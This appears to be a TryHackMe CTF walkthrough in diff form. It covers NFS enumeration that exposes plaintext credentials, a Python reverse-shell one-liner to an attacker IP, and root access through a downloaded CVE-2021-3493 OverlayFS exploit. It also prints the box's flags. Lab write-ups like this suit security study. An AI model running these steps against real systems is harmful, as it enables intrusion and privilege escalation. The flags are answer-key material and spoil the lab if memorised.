@@ -1,0 +1,220 @@
+Main IP :: 10.49.133.110
+
+
+Nmap scan report for 10.49.133.110
+Host is up (0.000075s latency).
+Not shown: 65527 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+111/tcp   open  rpcbind
+2049/tcp  open  nfs
+8080/tcp  open  http-proxy
+33869/tcp open  unknown
+38415/tcp open  unknown
+48609/tcp open  unknown
+50423/tcp open  unknown
+
+we started with the port scan and got this.
+
+Nmap scan report for 10.49.133.110
+Host is up, received echo-reply ttl 62 (0.064s latency).
+Scanned at 2026-05-05 18:26:39 +1245 for 9s
+
+PORT      STATE SERVICE  REASON         VERSION
+22/tcp    open  ssh      syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbRN8GvRSpA+ku5hqrPnyaobOvwYc4jddRGBHo91dNlIjNdX4LIRLCLdJkpMlW64MVwHV8QIjTFNxPqLQvOkbIn3yX+MQByFziSNf7h5+/tqrXDwZDMMqFAmZ7yeXoopcRY1cfumkYUHbjRxdrNj8Hpd8ol6xnIo9y+qiZx1HPpY3P9HsRpZ6XBq0bE3J68gBozFQmXa8gIU5aX+l0PHOdctWRo4vXa/oQteObsn9Rx+69WpatoDx1TdP4T3fGa3f1dMFIohCzlTUPJgzyGuRZq6JjaBvItUIGPg+isvkg7+diSLDCIo/U7vixeJNLrnvETMnRlwn0jOKxUFrtIwB7
+|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNz3AD3vWNpd2P1sXPm9tHrr6RQjBiCsXT0U/6euW2oK1RqQvipuiKTlcpNRRsXOxcIpscn+7M3nwW5Cgq0ipiA=
+|   256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAv5Jlh5/zgLa5D73WCXKa44htAWA67kUp4x5pGWgXri
+111/tcp   open  rpcbind  syn-ack ttl 62 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3           2049/udp6  nfs
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100005  1,2,3      37004/udp6  mountd
+|   100005  1,2,3      39173/tcp6  mountd
+|   100005  1,2,3      48609/tcp   mountd
+|   100005  1,2,3      56881/udp   mountd
+|   100021  1,3,4      33869/tcp   nlockmgr
+|   100021  1,3,4      39956/udp   nlockmgr
+|   100021  1,3,4      43518/udp6  nlockmgr
+|   100021  1,3,4      45989/tcp6  nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+2049/tcp  open  nfs      syn-ack ttl 62 3-4 (RPC #100003)
+8080/tcp  open  http     syn-ack ttl 62 Werkzeug httpd 0.14.1 (Python 3.6.9)
+|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
+|_http-title: CCHQ
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+33869/tcp open  nlockmgr syn-ack ttl 62 1-4 (RPC #100021)
+38415/tcp open  mountd   syn-ack ttl 62 1-3 (RPC #100005)
+48609/tcp open  mountd   syn-ack ttl 62 1-3 (RPC #100005)
+50423/tcp open  mountd   syn-ack ttl 62 1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+So we start with port 111
+
+ rpcinfo -p 10.49.133.110 
+   program vers proto   port  service
+    100000    4   tcp    111  portmapper
+    100000    3   tcp    111  portmapper
+    100000    2   tcp    111  portmapper
+    100000    4   udp    111  portmapper
+    100000    3   udp    111  portmapper
+    100000    2   udp    111  portmapper
+    100005    1   udp  33074  mountd
+    100005    1   tcp  50423  mountd
+    100005    2   udp  55717  mountd
+    100005    2   tcp  38415  mountd
+    100005    3   udp  56881  mountd
+    100005    3   tcp  48609  mountd
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100227    3   tcp   2049  nfs_acl
+    100003    3   udp   2049  nfs
+    100227    3   udp   2049  nfs_acl
+    100021    1   udp  39956  nlockmgr
+    100021    3   udp  39956  nlockmgr
+    100021    4   udp  39956  nlockmgr
+    100021    1   tcp  33869  nlockmgr
+    100021    3   tcp  33869  nlockmgr
+    100021    4   tcp  33869  nlockmgr
+
+
+
+So we started directly pentesting this 2 ports first and as per hint we will add
+port 111 and 2049
+
+showmount -e 10.49.133.110                            
+Export list for 10.49.133.110:
+/var/nfs/general *
+
+ mount -t nfs 10.49.133.110:/var/nfs/general /mnt -o nolock
+                                                                                      
+┌──(root㉿kali)-[/home/kali/thm/coctus]
+└─# cd /mnt 
+                                                                                      
+┌──(root㉿kali)-[/mnt]
+└─# ls
+credentials.bak
+
+so reading creds and will try ssh first.
+
+cat credentials.bak                                                       
+paradoxial.test
+ShibaPretzel79
+
+But still there is not muxh in to the ssh with above creds so let's move to web page on port 8080.
+
+
+──────────────────────────────────────────────────
+404      GET        4l       34w      233c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET     8582l    84777w  4194304c http://cooctus.thm:8080/static/desert.jpg (truncated to size limit)
+200      GET       30l       55w      603c http://cooctus.thm:8080/
+200      GET       18l       42w      556c http://cooctus.thm:8080/login
+302      GET        4l       24w      219c http://cooctus.thm:8080/cat => http://cooctus.thm:8080/login
+[####################] - 2m     20473/20473   0s      found:4       errors:0      
+[####################] - 2m     20469/20469   152/s   http://cooctus.thm:8080/                                                               
+
+
+So we are onto the login page which is sessionless on /cat also moving to the
+with creds we got above we have logged in and got there .
+
+
+Page says Welcome Cooctus Recruit!
+
+Here, you can test your exploits in a safe environment before launching them against your target. Please bear in mind, some functionality is still under development in the current version.
+
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.145.49",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+
+So After using above payload we are able to get the reverse shell.
+
+ nc -lvnp 4444  
+Listening on 0.0.0.0 4444
+Connection received on 10.49.154.170 48726
+bash: cannot set terminal process group (749): Inappropriate ioctl for device
+bash: no job control in this shell
+paradox@cchq:~$ cat user.txt
+
+THM{2dccd1ab3e03990aea77359831c85ca2}
+
+So now we will stabilize the shell using python commands and we will then take linpeas.sh into the attacker machine and will se which things it is vulnerable too.
+
+══════════╣ Kernel Exploit Registry (T1068)
+═╣ Operating system ............. Linux                                               
+═╣ Kernel release ............... 4.15.0-135-generic                                  
+═╣ Comparable version ........... 4.15.0.135                                          
+═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..21)  
+═╣ Kernel config source ......... /boot/config-4.15.0-135-generic                     
+CVE: CVE-2019-15666 | Name: XFRM_UAF | Match data: pkg=linux-kernel,ver>=3,ver<5.0.19,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1,CONFIG_XFRM=y | Tags: 1 | Rank: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled             
+CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.                                                                 
+CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded                                          
+CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)                                           
+═╣ Kernel vulns found: 4
+
+with this information we can see the kernel information and can say it is vulnerable to CVE-2021-3493
+
+we downloaded and again sent to it the attacker's machine  wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
+
+--2026-05-05 21:37:27--  https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3560 (3.5K) [text/plain]
+Saving to: ‘exploit.c’
+
+exploit.c             100%[=======================>]   3.48K  --.-KB/s    in 0s      
+
+2026-05-05 21:37:28 (12.0 MB/s) - ‘exploit.c’ saved [3560/3560]
+ with python3.
+ 
+   gcc exploit.c -o exploit
+paradox@cchq:/tmp$ ./exploit 
+bash-4.4# whoami
+root
+bash-4.4# ls
+exploit
+exploit.c
+linpeas.sh
+ovlcap
+systemd-private-aa88fd9f5ab748ab83af8a641ba2175e-systemd-resolved.service-g1wPlK
+systemd-private-aa88fd9f5ab748ab83af8a641ba2175e-systemd-timesyncd.service-EPF7l6
+tmux-1003
+bash-4.4# cat /root/root.txt 
+THM{H4CK3D_BY_C00CTUS_CL4N}
+bash-4.4# 
+
+so now we are root.
+
+Now we are root so we can pretty much read every user contents
+
+THM{c89f9f4ef264e22001f9a9c3d72992ef}
+
+so from szymex we have this.
+
+now again for tux
+THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}
+
+and lastly for varg user we can read this too.
+
+THM{3a33063a4a8a5805d17aa411a53286e6}
+
+
+
+ 
